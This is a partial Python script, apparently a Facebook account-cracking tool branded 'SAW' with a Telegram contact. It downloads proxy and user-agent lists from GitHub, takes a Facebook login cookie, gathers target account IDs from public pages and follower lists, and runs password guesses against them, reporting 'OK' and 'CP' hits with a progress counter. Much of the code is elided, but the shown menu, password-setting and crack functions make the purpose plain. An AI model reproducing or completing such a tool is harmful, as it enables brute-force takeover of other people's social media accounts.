...
princp=[]
try:
	prox= requests.get('https://github.com/Saw4x/IP/blob/main/SAW-IP.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Saw4x/Tools_fb/blob/main/SAW.txt').text
		ua=open('.SAW.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.SAW.txt','r').read().splitlines()
# INDICATION
...
\033[1;31m 	 		instagram  : 127.0.2
\033[1;37m 	 		Telegram  : SAW4x
\033[1;34m 	 		Version  : 6.0
''')
# LOGIN
def login():
	try:
...
def login_c():
	try:
		...
		cookie=input(f'%s[%s√%s]%s Cookie : '%(P,H,P,H))
		...
		print('%s[%s✔%s]%s Login successful \033[1;97m\033[1;41m python SAWx6.0.py \033[0m\033[1;93m'%(N,H,N,H));time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	print('%s 	 		[%s3%s]%s CRACK SAW FILE %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s 	 		[%s4%s]%s CONTACT %s[%sSAW%s]'%(P,H,P,H,P,H,P))
	print('%s 	 		[%s5%s]%s EXIT %s[%sLogOut%s]'%(P,H,P,H,P,H,P))
	SAW = input('%s 	 		[%s0%s]%s select menu %s : '%(N,H,N,H,M))
	if SAW in ['1','01']:
		public()
	elif SAW in ['2','02']:
		follower()
		...
		os.system('xdg-open https://t.me/SAW4x');menu(my_name,my_id)
	elif SAW in ['5','05']:
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print('\n\x1b[1;30m%s[%sSAW%s]%s-----%s[%sX4%s] '%(H,P,H,P,H,P,H,))
		print(' Use Passward Minimum 6 Digit')
		print('\n\x1b[1;30m%s[%sSAW%s]%s-----%s[%sX4%s] '%(H,P,H,P,H,P,H,))
		pwku=input('[ SAW ] Inter Your Passward : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	...
	banner()
	os.system('echo  "========================================================"')
	print("\x1b[1;37m   FACEBOOK ID : "+str(len(id)))
	...
	woi = input('[SAW] Inter You Choose  : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t[✔] Good Bye{u} ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}[SAW]{P}[{k}{loop}{P}/{h}{len(id)}{P}]-{P}[{H}OK - {ok}{P}]-{P}[{k}CP - {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
